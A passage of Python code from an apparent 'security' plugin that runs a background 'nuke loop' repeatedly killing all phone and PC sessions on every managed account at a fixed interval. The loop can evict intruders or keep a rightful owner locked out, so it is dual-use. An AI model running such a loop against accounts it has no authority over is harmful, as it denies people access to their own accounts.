            with self._nuke_lock:
                if self._nuke_on and self._nuke_thread and self._nuke_thread.is_alive():
                    return
                self._nuke_on = True
                self._nuke_thread = threading.Thread(target=self._nuke_loop, daemon=True)
                self._nuke_thread.start()
        except Exception:
            pass

    def _start_nuke_loop(self):
        with self._nuke_lock:
            if self._nuke_on and self._nuke_thread and self._nuke_thread.is_alive():
                self._send_msg("Nuke already running")
                return
            self._nuke_on = True
            self._nuke_pass = 0
            self._mark_nuke()
            self._nuke_thread = threading.Thread(target=self._nuke_loop, daemon=True)
            self._nuke_thread.start()
        self._send_msg("Nuke loop STARTED")

    def _stop_nuke_loop(self):
        with self._nuke_lock:
            self._nuke_on = False
        try:
            m = self._nuke_marker_path()
            if m and os.path.exists(m):
                os.remove(m)
        except Exception:
            pass
        self._send_msg("Nuke loop STOPPED")

    def _nuke_loop(self):
        while True:
            with self._nuke_lock:
                if not self._nuke_on or not self._sync_running or self.stop:
                    return
            self._nuke_pass += 1
            try:
                for a in self._get_accounts_list():
                    self._kill_all_sessions(a.get("id", 0), phones_pc_only=True)
            except Exception as e:
                _log("nuke pass %d: %s" % (self._nuke_pass, e))
            slept = 0
            while slept < self._nuke_interval:
                with self._nuke_lock:
                    if not self._nuke_on or not self._sync_running or self.stop:
                        return
                time.sleep(1)
                slept += 1


def create_plugin():
    return PluginSecurityPlugin()
